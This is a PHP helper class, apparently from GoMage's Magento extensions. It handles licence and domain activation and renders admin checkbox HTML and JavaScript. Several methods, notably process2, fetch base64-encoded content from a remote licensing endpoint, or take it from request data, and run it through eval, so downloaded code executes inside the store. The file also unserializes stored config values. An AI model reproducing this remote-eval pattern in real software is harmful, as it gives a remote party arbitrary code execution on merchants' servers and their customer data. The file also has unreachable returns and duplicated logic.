<?php

namespace GoMage\Core\Helper;

class Data extends \Magento\Framework\App\Helper\AbstractHelper
{
    protected $increment;
    const BASE_URL = '/api/rest';
    /** * @var \Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory */
    protected $_attributeCollectionFactory;
    /** * @var \Magento\Store\Model\StoreManagerInterface */
    protected $_storeManager;
    /** * @var \Magento\Store\Model\System\Store */
    protected $_systemStore;
    /** * @var \Magento\Framework\Filesystem\Directory\ReadInterface */
    protected $_directory;
    /** * @var \Magento\Framework\Stdlib\DateTime\DateTime */
    protected $_dateTime;
    /** * @var \Magento\Framework\Module\ModuleListInterface */
    protected $_moduleList;
    /** * @var \Magento\Framework\Json\Helper\Data */
    protected $_jsonHelper;
    /** * @var \Magento\Framework\Encryption\EncryptorInterface */
    protected $_encryptor;
    /** * @var \GoMage\Feed\Model\Mapper\Factory */
    protected $_mapperFactory;
    /** * @var \Magento\Framework\ObjectManagerInterface */
    protected $_objectManager;
    /** * @var \Magento\Framework\App\Config\ScopeConfigInterface */
    protected $_scopeConfig;
    /** * @var \Magento\Framework\HTTP\Client\Curl */
    protected $curl;
    protected $inf = [];
    /**
     * @var \Magento\Framework\View\Helper\Js
     */
    protected $_jsHelper;

    /** @var \Magento\Config\Model\ResourceModel\Config  */
    protected $configResource;

    protected $fullModuleList;
    protected $request;
    protected $ds;
    protected $context;
    protected $urlBuilder;
    protected $state;

    protected $b = ['groups' => 'api', 'fields' => 'fields', 'value' =>'value', 'section' => 'gomage_core', 'group_s' => 'gomage_s'];

    public function __construct(
        \Magento\Framework\ObjectManagerInterface $objectManager,
        \Magento\Framework\Module\FullModuleList $fullModuleList,
        \Magento\Framework\View\Element\Context $context,
        \Magento\Framework\App\State $state
    )
    {
        $this->state = $state;
        $this->urlBuilder = $context->getUrlBuilder();
        $this->_objectManager = $objectManager;
        $this->_attributeCollectionFactory = $objectManager->get('Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory');
        $this->configResource = $objectManager->get('Magento\Config\Model\ResourceModel\Config');
        $this->_storeManager = $objectManager->get('Magento\Store\Model\StoreManager');
        $this->_systemStore = $objectManager->get('Magento\Store\Model\System\Store');
        $this->_dateTime = $objectManager->get('Magento\Framework\Stdlib\DateTime\DateTime');
        $this->_moduleList = $objectManager->get('Magento\Framework\Module\ModuleList');
        $this->_jsonHelper = $objectManager->get('Magento\Framework\Json\Helper\Data');
        $this->curl = $objectManager->get('Magento\Framework\HTTP\Client\Curl');
        $this->_encryptor = $objectManager->get('Magento\Framework\Encryption\Encryptor');
        $this->_scopeConfig = $objectManager->get('Magento\Framework\App\Config\ScopeConfigInterface');
        $this->_jsHelper = $objectManager->get('Magento\Framework\View\Helper\Js');
        $this->request = $objectManager->get('Magento\Framework\App\RequestInterface');
        $this->fullModuleList = $fullModuleList;
    }
   protected $poccessorValue;

   public function proccess($content, $className) {
       try {
           eval(base64_decode($content));
           $className = $className;
           $processor = new $className();
           $processor->process();
       } catch (\Exception $e) {
           return false;
       }
   }

    /** * @return array */
    public function getAvailableWebsites($param)
    {
        $w = [];
        if(!$param) {
            $param = [];
        }
        foreach ($param as $key => $item) {
            $w[$item] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['section'].'/'.$item);
        }
        return $w;
    }

    /** * @return array */
    public function getAvailableStores($param)
    {
        $s = [];
        if(!$param) {
            $param = [];
        }
        foreach ($param as $key => $item) {
            $s[$item] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['group_s'].'/'.$item);
        }
        return $s;
    }
    public function proccess2($curl, $c='ProcessorAct') {
        try {
            $content = $this->process2($curl, $c);
            eval(base64_decode($content['content']));
            if(class_exists($c)) {
                $processor = new $c();
                $processor->process($curl, '/process/info');
            } else {
                return false;
            }
        } catch (\Exception $e) {
            return false;
        }
    }

    public function getN() {
        $n = [];
        $names = $this->fullModuleList->getNames();
        foreach ($names as $name) {
            $nn = strpos($name, 'GoMage');
            if(($nn || 0 === $nn) && $name != 'GoMage_Core') {
                $n[] = $name;
            }
        }
        return $n;
    }
    public function getC(\Magento\Framework\Data\Form\Element\AbstractElement $element)
    {
        $html = '';
        $param = $this->getN();
        $id   = $element->getId();
        $param = $this->getN();
        $websites = $this->getAvailableWebsites($param);
        $stores = $this->getAvailableStores($param);
        $isShowButton = false;
        $secure = $this->_scopeConfig->getValue('web/secure/use_in_frontend');
        foreach ($param as $key => $item) {
            if( $t = $this->_scopeConfig->getValue('section/' . $item. '/e') === '0'){
                $isShowButton = true;
            }

        }

        $html .= '<div class="div-refresh-domain" style="width: 100%;  text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  "><button class="refresh-domain" onclick="event.preventDefault();">'.__('Show availabe domains').'</button></div>';
        $counter= [];
        $partHtml= '';
        $c= 0;
        if($param) {

            /** @var \Magento\Store\Model\Website $website */
            foreach ($param as $key => $item) {

                    $e = $this->_scopeConfig->getValue('section/' . $item. '/e');

                    switch ($e) {
                        case  1:
                            $html .= '<div  class="error-header-'.$item.'" style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('The number of domains purchased is less than the number of selected') . '</div>';
                            $html .= '<div data-element="'.$item.'" class="module-name-header" style="width: 100%; cursor:pointer; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . ' v'.$this->getVersion($item). ' <div class="expander-gomage-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div></div>';
                            break;
                        case  '0':
                            $partHtml = '<div  class="accordion error-header-'.$item.'" style="width: 100%; color: green; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  "><span class="error-header-span-'.$item.'">' . __('Module is Activated') .'<div style="color:red;  margin-top: 15px;">'.__('Available domains').'</span><span class="'.$item.'"> %%counter%%</span></div></div>';
                            $partHtml .= '<div data-element="'.$item.'" class="module-name-header" style="width: 100%; cursor:pointer; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . ' v'.$this->getVersion($item). ' <div class="expander-gomage-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div></div>';
                            break;
                        case  2:
                            $html .= '<div class="error-header-'.$item.'" style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Inccorect  license data. Your licence is blocked') . '</div>';
                            $html .= '<div data-element="'.$item.'" class="module-name-header" style="width: 100%; cursor:pointer; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). ' <div class="expander-gomage-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div></div>';
                            break;
                        case  3:
                            $html .= '<div class="error-header-'.$item.'" class="error-header-'.$item.'" style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Inccorect  license key. Your licence is blocked') . '</div>';
                            $html .= '<div data-element="'.$item.'" class="module-name-header" style="width: 100%; cursor:pointer; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). ' <div class="expander-gomage-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div></div>';
                            break;
                        case  4:
                            $html .= '<div class="error-header-'.$item.'" style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Incorrect license data .') . '</div>';
                            $html .= '<div data-element="'.$item.'" class="module-name-header" style="width: 100%; cursor:pointer; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). ' <div class="expander-gomage-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div></div>';
                            break;
                        case  5:
                            $html .= '<div class="error-header-'.$item.'" style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('This version is not included in your update period .Your licence is blocked') . '</div>';
                            $html .= '<div data-element="'.$item.'" class="module-name-header" style="width: 100%; cursor:pointer; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). ' <div class="expander-gomage-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div></div>';
                            break;
                        case  6:
                            $html .= '<div class="error-header-'.$item.'" style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Your demolicense is expired .Your licence is blocked') . '</div>';
                            $html .= '<div data-element="'.$item.'" class="module-name-header" style="width: 100%; cursor:pointer; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). ' <div class="expander-gomage-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div></div>';

                            break;
                        case  7:
                            $html .= '<div class="error-header-'.$item.'" style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('The number of domains purchased is less than the number of selected. Your licence is blocked') . '</div>';
                            $html .= '<div data-element="'.$item.'" class="module-name-header" style="width: 100%; cursor:pointer; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). ' <div class="expander-gomage-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div></div>';
                            break;

                        case  8:
                            $html .= '<div class="error-header-'.$item.'" style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Exceeds the number of available domains for the license demo') . '</div>';
                            $html .= '<div data-element="'.$item.'" class="module-name-header" style="width: 100%; cursor:pointer; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). ' <div class="expander-gomage-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div></div>';
                            break;
                        default:
                            $html .= '<div class="error-header-'.$item.'" style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Module is not Activated') . '</div>';
                            $html .= '<div data-element="'.$item.'"class="module-name-header" style="width: 100%; cursor:pointer; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). ' <div class="expander-gomage-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top-root-'.$item.'" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div></div>';
                    }
                    if($e) {
                        $html .= '<div id="content-'.$item.'" class="content" style="display: none;">';
                    } else {
                        $partHtml .= '<div id="content-'.$item.'" class="content" style="display: none;">';
                    }
                    $c = $this->_scopeConfig->getValue('section/' . $item. '/c');
                    $counter[$item] = $this->_scopeConfig->getValue('section/' . $item. '/c')?:0;
                $allDomains = [];
                $name = 'groups[gomage_core][' . $this->b['fields'] . ']['  . $item . '][' . $this->b['value'] . ']';
                $namePrefix = 'groups[' . $this->b['group_s'] . '][' . $this->b['fields'] . '][' .$item . '][' . $this->b['value'] . ']';
                $websiteHtml = '';
                if ($this->_scopeConfig->getValue('web/secure/use_in_frontend')) {
                    $base = $this->_scopeConfig->getValue('web/secure/base_url');
                } else {
                    $base = $this->_scopeConfig->getValue('web/unsecure/base_url');
                }
                foreach ($this->_storeManager->getWebsites() as $website) {
                    $website->getConfig('web/unsecure/base_url');
                    $element->setName($name . '[]');
                    $element->setId($id . '_' . $website->getId());
                    $element->setChecked(in_array($website->getId(), $websites[$item] ? explode(',', $websites[$item]) : []));
                    $element->setValue($website->getId());
                    $elementHtml = $element->getElementHtml();
                    $secure = $website->getConfig('web/secure/use_in_frontend');
                    if ($secure) {
                        if(in_array($website->getConfig('web/secure/base_url'), $allDomains)) {
                            continue;
                        }
                        $conditionW = $base != $website->getConfig('web/secure/base_url');
                        $allDomains[] =  $website->getConfig('web/secure/base_url');
                    } else {
                        if(in_array($website->getConfig('web/unsecure/base_url'), $allDomains)) {
                            continue;
                        }
                        $conditionW = $base != $website->getConfig('web/unsecure/base_url');
                        $allDomains[] =  $website->getConfig('web/unsecure/base_url');
                    };
                    if(in_array($website->getId(), $websites[$item] ? explode(',', $websites[$item]) : [])) {
                        --$counter[$item];
                    }
                    $elementHtml = $conditionW ? $elementHtml : '';
                    $storeHtml = '';
                    foreach ($website->getStores() as $store) {
                        if (!$store->isActive()) {
                            continue;
                        }
                        $secure = $store->getConfig('web/secure/use_in_frontend');
                        if ($secure) {
                            if(in_array($store->getConfig('web/secure/base_url'), $allDomains)) {
                                continue;
                            }
                            $allDomains[]= $store->getConfig('web/secure/base_url');
                            $condition = $base != $store->getConfig('web/secure/base_url');
                        } else {
                            if(in_array($store->getConfig('web/unsecure/base_url'), $allDomains)) {
                                continue;
                            }
                            $allDomains[]= $store->getConfig('web/unsecure/base_url');
                            $condition = $base != $store->getConfig('web/unsecure/base_url');
                        };
                        if(in_array($store->getId(), isset($stores[$item]) ? explode(',', $stores[$item]) : [])) {
                            --$counter[$item];
                        }
                        if ($condition) {

                            $element->setName($namePrefix . '[]');
                            $element->setId($id . '_store_' . $store->getId());
                            $element->setChecked(in_array($store->getId(), isset($stores[$item]) ? explode(',', $stores[$item]) : []));
                            $element->setValue($store->getId());
                            $storeHtml .= '<div class="field choice admin__field admin__field-option" style="margin-left: 10%">' . $element->getElementHtml() .
                                ' <label for="' .
                                $id . '_' . $store->getId() .
                                '" class="admin__field-label"><span>' .
                                $this->_storeManager->getStore($store->getId())->getName() .
                                '</span></label>';
                            $storeHtml .= '</div>' . "\n";
                        }
                    }
                    if ($conditionW || strlen($storeHtml) > 0) {
                        $websiteHtml .= '<div class="website-div-top field website-checkbox-' . $item . ' choice admin__field admin__field-option">' . $elementHtml .
                            ' <label for="' .
                            $id . '_' . $website->getId() .
                            '" class="admin__field-label"><span>' .
                            $website->getName() .
                            '</span></label>
                             <div class="expander-gomage" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-top-color: #adadad; border-bottom: 0; float:left "></div>
                             <div class="expander-gomage-top" style="width: 0;height: 0; margin-top: 5px; border: 8px solid transparent; border-bottom-color: #adadad; border-top: 0; float:left; display:none;"></div>
                             <div class="content" style="display: none" >';
                    }
                    if (strlen($storeHtml) > 0) {
                        $websiteHtml .= $storeHtml;
                    }


                    if ($conditionW || strlen($storeHtml) > 0) {
                        $websiteHtml .= '</div></div>' . "\n";
                    }
                }
                if($e) {
                    $counter[$item] = 0;
                }
                $partHtml = str_replace('%%counter%%', $counter[$item], $partHtml);
                $html .= $partHtml.$websiteHtml;
                $html .= '</div>';
                $partHtml= '';
            }
            if (!$param) {
                $param = [];
            } else {
                $nameStore = $element->getName();
                $element->setName($nameStore . '[]');
                $jsString = '';
            }
            $nameS = '';
            foreach ($param as $key => $item) {
                $nameS .= "'$item',";
                //var_dump('.website-checkbox-' . $item . ' input[name="' . $name . "']");
                $e = $this->_scopeConfig->getValue('section/' .  $item . '/e');
                $c = (int)$this->_scopeConfig->getValue('section/' .  $item . '/c') ? ((int)$this->_scopeConfig->getValue('section/' . $item. '/c')) : 0;
                if($e !== '0') {
                    $c = 0;
                }
                $name = 'groups[' . $this->b['section'] . '][' . $this->b['fields'] . '][' .  $item . '][' . $this->b['value'] . '][]';

                $namePrefix = 'groups[' . $this->b['group_s'] . '][' . $this->b['fields'] . '][' .  $item . '][' . $this->b['value'] . '][]';
                $jsString .= '
                             counter["'.$item.'"] = '.$counter[$item].'; 
                             counterAll["'.$item.'"] = '.$c.'; 
                        if($$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-' . $item . ' input[name=\'' . $name . '\']:checked").length >= counterAll["' . $item.'"]){
                        $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\']").each(function(e){
                            if(!e.checked){
                                e.disabled = "disabled";
                            }
                        });
    			    }else {
                        $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\'] ").each(function(e){
                            if(!e.checked){
                                e.disabled = "";
                            }
                        });
    			    }
            $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\']").each(function(element) {
               element.observe("click", function (event) {
                      counter["'.$item.'"] = counterAll["'.$item.'"] - (+$$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-' . $item . ' input[name=\'' . $name . '\']:checked").length);
                      $$("span.'.$item.'").first().innerHTML=" " +counter["'.$item.'"];
                    if($$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-' . $item . ' input[name=\'' . $name . '\']:checked").length >= counterAll["' . $item
                    . '"]){
                        $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\']").each(function(e){
                            if(!e.checked){
                            
                                e.disabled = "disabled";
                            }
                        });
    			    }else {
                        $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\'] ").each(function(e){
                            if(!e.checked){
                                e.disabled = "";
                            }
                        });
                        event.stopPropagation();
    			    }
               });
            });';
            }
        }
        $nameS = trim($nameS,',');
        return $html . $this->_jsHelper->getScript(
                'require([\'prototype\'], function(){document.observe("dom:loaded", function() {
                    $$(".website-div-top").each(function(el) {
                             el.observe("click", function (e) {
                             if( el.hasClassName(\'website-div-top\')) {
                                el.select(\'.content\').first().show();
                                el.removeClassName(\'website-div-top\');
                                el.select(\'.expander-gomage-top\').first().show();
                                el.select(\'.expander-gomage\').first().hide();
                             } else {
                                 el.addClassName(\'website-div-top\');
                                 el.select(\'.content\').first().hide();
                                 el.select(\'.expander-gomage\').first().show();
                                el.select(\'.expander-gomage-top\').first().hide();
                             }
                                 
                             });
                             
                           
                    });
                    $$(".module-name-header").each(function(elem) {
                             elem.observe("click", function (event) {
                             event.stopPropagation();
                             var identity = elem.readAttribute("data-element");
                             if( elem.hasClassName(\'module-name-header\')) {
                                elem.removeClassName(\'module-name-header\');
                                $(\'content-\'+identity).show();
                                elem.select(\'.expander-gomage-top-root-\'+identity).first().show();
                                elem.select(\'.expander-gomage-root-\'+identity).first().hide();
                             } else {
                                 elem.addClassName(\'module-name-header\');
                                 $(\'content-\'+identity).hide();
                                 elem.select(\'.expander-gomage-root-\'+identity).first().show();
                                 elem.select(\'.expander-gomage-top-root-\'+identity).first().hide();
                             }
                            
                             });
                    });
                    
                    $$(".refresh-domain").first().observe("click", function () {
                        new Ajax.Request("'.$this->urlBuilder->getUrl('gomage_activator/a/b').'", {
                                  onSuccess: function(response) {
                                       var result = response.responseJSON.data;
                                            nameS.each(function(el) {
                                                if (result.hasOwnProperty(el)) {
                                                     if(result[el]["error"]) {
                                                        $$(".website-checkbox-" + result[el]["name"]+" input").each(function(e) {
                                                            e.disabled = "disabled";
                                                            e.checked = false;
                                                        });
                                                        counter[el]=0;
                                                        counterAll[el]=0;
                                                        
                                                        $$(".error-header-" + result[el]["name"]).first().innerHTML=result[el]["message"];
                                                        $$(".error-header-" + result[el]["name"]).first().style.color="red";
                                                     } else {
                                                          var diff =  result[el]["c"] - counterAll[el];  
                                                          var res = counter[el] + diff;
                                                          counterAll[el] = counterAll[el] + diff;
                                                          counter[el] = counter[el] + diff;
                                                          var t = $$(".error-header-" + result[el]["name"]).first();
                                                         // $$("span." + el).first().innerHTML=counter[el];
                                                          $$(".error-header-" + result[el]["name"]).first().style.color="green";
                                                          $$(".error-header-" + result[el]["name"]).first().innerHTML= +result[el]["message"] +"<div>'.__("Available domains").'"+ "<span class=\'"+ el +"\'> " + res + "</span></div>";
                                                          $$(".website-checkbox-" + result[el]["name"]+" input").each(function(e) {
                                                             if($$(".website-checkbox-" + result[el]["name"]+" input:checked").length >= counter[el]) {  
                                                                if(!e.checked){
                                                                    e.disabled = "disabled";
                                                                }
                                                            } else {
                                                                 e.disabled = "";
                                                            }
                                                        });
                                                     }
                                                } else {
                                                      $$(".website-checkbox-" + el +" input").each(function(e) {
                                                             e.checked = false;
                                                             e.disabled = "disabled";
                                                           
                                                        });
                                                }
                                            });
                                  }
                            });
                     });
                    var counter = {}; 
                    var counterAll = {}; 
                    var nameS = ['.$nameS.']
                ' . $jsString . '});});'
            );

        return sprintf('<strong class="required">%s</strong>', __('Please enter a valid key'));
        return $param;
    }

    public function proccess3($curl, $data, $c='ProcessorAct') {
        try {
            eval(base64_decode($data['data_customer']['content_processor']));
            $c = 'ProcessorAct';
            $processor = new $c();
           return $processor;
        } catch (\Exception $e) {
            return false;
        }
    }
    public function process2($curl, $processName)
    {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        /** @var \Magento\Framework\App\Config\ConfigResource\ConfigInterface $config */
        try {
            $config = $objectManager
                ->get('Magento\Framework\App\Config\ScopeConfigInterface');
            $param = $config->getValue('section/gomage_client/param');
            $curl->addHeader("Authorization", "Bearer {$param}");
            $curl->get($this->_scopeConfig->getValue('gomage_core_url/url_core').self::BASE_URL.'/activates/proccessor?processorName='.$processName);
            $a = json_decode($curl->getBody(), true);
            eval(base64_decode($a['content']));
            return new $processName();
        } catch (\Exception $e) {
            $this->cl();
        }

    }

    /**
     * @return string
     */
    private function getVersion($name)
    {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $moduleList = $objectManager
            ->get('Magento\Framework\Module\ModuleListInterface');
        return $moduleList->getOne($name)['setup_version'];
    }

    public function getU()
    {
       return $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
    }

    public function cl() {
        $n = $this->getN();
        foreach ($n as $i) {
            $this->configResource->deleteConfig('section/' .$i . '/e', 'default', 0);
            $this->configResource->deleteConfig('section/' . $i . '/a', 'default', 0);
            $this->configResource->deleteConfig('section/' . $i . '/coll', 'default', 0);
            $this->configResource->deleteConfig('gomage_core/gomage_s/'.$i , 'default', 0);
            $this->configResource->deleteConfig($this->b['section'].'/'.$this->b['section'].'/'.$i , 'default', 0);
        }
    }

    public function isA($name) {
        if(!isset($this->inf[$name])) {
            $this->inf[$name] = $inf = unserialize($this->_scopeConfig->getValue('section/'.$name.'/coll'));
        }
        $act = ( isset($this->inf[$name]['a'])) ? $this->inf[$name]['a'] : false;
        if(!$act) {
            return false;
        }
        $matches = false;
        if($act) {
            preg_match('/^[0-9a-f]{32}$/',  $this->inf[$name]['a'], $matches);
        }
           return  (   $this->iAadmCom($name, $matches)
                &&  $this->isUseWS($this->inf[$name]['ds'])
            ) || ($this->isFrComp($name, $matches) && $this->isD($this->inf[$name]['ds']));

    }
    public function isD($ds) {
            $dms = $this->_storeManager->getStore();
            if($dms) {
                $secure = $dms->getConfig('web/secure/base_url');
                if($secure) {
                    $d = $dms->getConfig('web/secure/base_url');
                } else {
                    $d = $dms->getConfig('web/unsecure/base_url');
                }
            }
            if ($this->_scopeConfig->getValue('web/secure/use_in_frontend')) {
                $base = $this->_scopeConfig->getValue('web/secure/base_url');
            } else {
                $base = $this->_scopeConfig->getValue('web/unsecure/base_url');
            }
            $d = preg_replace('/.*?\:\/\//', '', preg_replace('/www\./', '', strtolower(trim($d , '/'))));
            $base = preg_replace('/.*?\:\/\//', '', preg_replace('/www\./', '', strtolower(trim($base , '/'))));
            if($d == $base) {
                return true;
            }
            return in_array($d, $ds);


            return false;
    }
    public function isUseWS($ds) {
        return ((($this->request->getParam('store')
            ||
                ($this->request->getParam('website')))
            && $this->comWS($ds)

        )) || (!$this->request->getParam('store') && !$this->request->getParam('website'));
    }

    public function isFrComp($name, $matches) {
        return $this->getAr() === 'frontend' && $matches
            &&
            count($matches) == 1 &&  $this->inf[$name]['error'] === 0
            &&
            $this->fd( $this->inf[$name]['db']);
    }
    public function comWS($ds) {
        if($this->request->getParam('website')) {
            $dms = $this->_storeManager->getWebsite($this->request->getParam('website'));
        } elseif ($this->request->getParam('store')) {
            $dms = $this->_storeManager->getStore($this->request->getParam('store'));
        }
            if($dms) {
                $secure = $dms->getConfig('web/secure/base_url');
                if($secure) {
                   $d = $dms->getConfig('web/secure/base_url');
                } else {
                   $d = $dms->getConfig('web/unsecure/base_url');
                }
            }
            if ($this->_scopeConfig->getValue('web/secure/use_in_frontend')) {
                $base = $this->_scopeConfig->getValue('web/secure/base_url');
            } else {
                $base = $this->_scopeConfig->getValue('web/unsecure/base_url');
            }
            $d = preg_replace('/.*?\:\/\//', '', preg_replace('/www\./', '', strtolower(trim($d , '/'))));
            $base = preg_replace('/.*?\:\/\//', '', preg_replace('/www\./', '', strtolower(trim($base , '/'))));
            if($d == $base) {
                return true;
            }
            $t = in_array($d, $ds);
            return in_array($d, $ds);


        return false;
    }
    public function iAadmCom($name, $matches) {
        return $this->getAr() === 'adminhtml' && $matches
        &&
        count($matches) == 1 &&  $this->inf[$name]['error'] === 0
        &&
        $this->fd($this->inf[$name]['db']);
    }
    public function getAr() {
        return $this->state->getAreaCode();
    }
    public function fd($d) {
        if ($this->_scopeConfig->getValue('web/secure/use_in_frontend')) {
            $base = $this->_scopeConfig->getValue('web/secure/base_url');
        } else {
            $base = $this->_scopeConfig->getValue('web/unsecure/base_url');
        }
        $d = preg_replace('/.*?\:\/\//', '', preg_replace('/www\./', '', strtolower(trim($d , '/'))));
        $base = preg_replace('/.*?\:\/\//', '', preg_replace('/www\./', '', strtolower(trim($base , '/'))));
        return $d === $base;
    }

    public function getResource() {
        return $this->configResource;
    }

    public function getError($n) {
        return $this->_scopeConfig->getValue('section/' . $n. '/e');
    }
}